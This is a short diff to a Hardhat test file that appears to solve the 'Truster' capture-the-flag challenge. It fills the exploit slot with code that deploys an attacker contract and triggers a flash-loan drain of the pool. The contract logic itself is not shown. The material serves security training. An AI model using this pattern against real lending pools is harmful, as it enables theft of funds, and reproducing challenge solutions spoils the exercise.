@@ -28,7 +28,10 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
+		/** CODE YOUR EXPLOIT HERE  */
+		const ReceiverContractFactory = await ethers.getContractFactory("ReceiverTruster", deployer);
+		this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address, this.token.address);
+		await this.receiverContract.connect(attacker).executeFlashLoan(TOKENS_IN_POOL);
     });
 
     after(async function () {
